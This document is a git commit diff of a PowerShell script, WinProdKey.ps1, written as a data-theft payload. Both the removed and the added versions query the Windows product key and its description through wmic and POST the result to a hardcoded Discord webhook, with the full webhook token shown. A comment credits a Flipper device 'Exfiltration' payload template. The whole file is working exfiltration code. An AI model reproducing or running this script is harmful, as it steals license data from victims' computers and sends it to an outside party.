f4b1d687432664a8395e4a0ced9b604b76296392
NazarHK <nazarburlan2@gmail.com>
2024-12-28 20:28:31 +0100

    Update WinProdKey.ps1

--- WinProdKey.ps1
+++ WinProdKey.ps1
@@ -1,4 +1,11 @@
-$u = 'https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K'
-$k = (wmic path softwarelicensingservice get OA3xOriginalProductKey | Select-String -Pattern '\w{5}-\w{5}-\w{5}-\w{5}-\w{5}' | foreach { $_.Matches.Value }) -join ''
-$k = [string]::IsNullOrEmpty($k) ? 'No key' : $k
-irm -Uri $u -Method Post -Body @{content=$k} | ConvertTo-Json -Depth 1
+# by template used aleff's code (https://github.com/aleff-github/my-flipper-shits/blob/main/Windows/Exfiltration/Exfiltrate_Windows_Product_Key/payload.txt)
+$hookUrl = 'https://discord.com/api/webhooks/1322635423369003129/Z0eJb-VnYmu33ZOYHl6ESyQybDtgZ4ODMgbV22ifsRivbQr8UZlhlISrv9O9_h8sRf3K'
+$exfiltration = @"
+$(wmic path softwarelicensingservice get OA3xOriginalProductKey)
+$(wmic path softwarelicensingservice get OA3xOriginalProductKeyDescription)
+"@
+$payload = [PSCustomObject]@{
+    content = $exfiltration
+}
+Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'
+exit
